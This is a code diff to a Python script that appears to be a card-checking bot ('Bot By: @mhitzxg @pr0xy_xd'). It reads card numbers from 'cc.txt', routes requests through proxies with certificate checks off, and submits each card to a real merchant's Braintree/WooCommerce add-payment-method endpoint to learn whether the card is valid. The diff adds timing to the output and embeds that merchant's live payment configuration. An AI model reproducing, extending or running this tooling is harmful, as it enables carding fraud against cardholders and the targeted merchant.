@@ -491,6 +491,7 @@ file = open('cc.txt', "r+")
 start_num = 0
 
 for P in file.readlines():
+    start_time = time.time()
     start_num += 1
 
     # Add random delay between requests
@@ -584,6 +585,8 @@ for P in file.readlines():
             proxies=proxy,
             verify=False
         )
+        end_time = time.time()
+        elapsed_time = end_time - start_time
 
         if response.status_code == 200:
             try:
@@ -617,7 +620,7 @@ for P in file.readlines():
                         'braintree_cc_nonce_key': token,
                         'braintree_cc_device_data': '{"correlation_id":"cc600ecf-f0e1-4316-ac29-7ad78aea"}',
                         'braintree_cc_3ds_nonce_key': '',
-                        'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/wcr3cvc237q7jz6b/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/wcr3cvc237q7jz6b"},"merchantId":"wcr3cvc237q7jz6b","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["Discover","Maestro","UK Maestro","MasterCard","Visa","American Express"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIzYjg0OGU1NS1jY2EyLTRiZGUtODY3MS01OTJiODkzNjA1ZGUiLCJpYXQiOjE3NDk3MzMyMjcsImVxpCI6MTc0OTc0MDQyNywiaXNzIjoiNWQyZTYwYTFmYWI4ZDUxYzE4ZDdhNzdlIiwiT3JnVW5pdElkIjoiNWQyZTYwYTE2OTRlM2E0NDY0ZWRkN2NlIn0.jVz8RHEJRVCxCiXKnm0jv9uYuuEUEWopnrbi9A2ng_Y"},"paypalEnabled":true,"paypal":{"displayName":"Hakko","clientId":"AR5mQQV5vUNYSF9-TCEtSXM7mHHUfFc5hSihOKKmEyMzg9z0FNLzrfdVyTK-X_06XQ4ZCCbFww-R91jp","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"hakkoGBP","payeeEmail":null,"currencyIsoCode":"GBP"}}',
+                        'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/wcr3cvc237q7jz6b/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/wcr3cvc237q7jz6b"},"merchantId":"wcr3cvc237q7jz6b","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["Discover","Maestro","UK Maestro","MasterCard","Visa","American Express"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIzYjg0OGU1NS1jY2EyLTRiZGUtODY3MS01OTJiODkzNjA1ZGUiLCJpYXQiOjE3NDk3MzMyMjcsImV4cCI6MTc0OTc0MDQyNywiaXNzIjoiNWQyZTYwYTFmYWI4ZDUxYzE4ZDdhNzdlIiwiT3JnVW5pdElkIjoiNWQyZTYwYTE2OTRlM2E0NDY0ZWRkN2NlIn0.jVz8RHEJRVCxCiXKnm0jv9uYuuEUEWopnrbi9A2ng_Y"},"paypalEnabled":true,"paypal":{"displayName":"Hakko","clientId":"AR5mQQV5vUNYSF9-TCEtSXM7mHHUfFc5hSihOKKmEyMzg9z0FNLzrfdVyTK-X_06XQ4ZCCbFww-R91jp","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"hakkoGBP","payeeEmail":null,"currencyIsoCode":"GBP"}}',
                         'woocommerce-add-payment-method-nonce': add_nonce,
                         '_wp_http_referer': '/my-account/add-payment-method/',
                         'woocommerce_add_payment_method': '1',
@@ -632,6 +635,8 @@ for P in file.readlines():
                         proxies=proxy,
                         verify=False
                     )
+                    end_time = time.time()
+                    elapsed_time = end_time - start_time
 
                     if response.status_code == 200:
                         soup = BeautifulSoup(response.text, 'html.parser')
@@ -685,19 +690,21 @@ Bot By: 『@mhitzxg 帝 @pr0xy_xd』
                                     basic_response = f"Card: {n}|{mm}|{yy}|{cvc} - {message} - Cookie Pair: {SELECTED_COOKIE_PAIR['id']} - Time: {elapsed_time:.1f}s"
                                     print(basic_response)
                             else:
-                                print(f"Card {n}: No message found in response")
+                                print(f"Card {n}: No message found in response (Time taken: {elapsed_time:.2f} seconds)")
                         else:
-                            print(f"Card {n}: No woocommerce-notices-wrapper found")
+                            print(f"Card {n}: No woocommerce-notices-wrapper found (Time taken: {elapsed_time:.2f} seconds)")
                     else:
-                        print(f"Card {n}: Failed to add payment method, status code: {response.status_code}")
+                        print(f"Card {n}: Failed to add payment method, status code: {response.status_code} (Time taken: {elapsed_time:.2f} seconds)")
                 else:
-                    print(f"Card {n}: Invalid or missing token data in response")
+                    print(f"Card {n}: Invalid or missing token data in response (Time taken: {elapsed_time:.2f} seconds)")
             except ValueError as e:
-                print(f"Card {n}: Invalid JSON response from tokenization: {str(e)}")
+                print(f"Card {n}: Invalid JSON response from tokenization: {str(e)} (Time taken: {elapsed_time:.2f} seconds)")
         else:
-            print(f"Card {n}: Tokenization failed, status code: {response.status_code}")
+            print(f"Card {n}: Tokenization failed, status code: {response.status_code} (Time taken: {elapsed_time:.2f} seconds)")
     except IndexError:
-        print(f"Invalid card format: {P}")
+        end_time = time.time()
+        elapsed_time = end_time - start_time
+        print(f"Invalid card format: {P} (Time taken: {elapsed_time:.2f} seconds)")
         continue
 
 file.close()
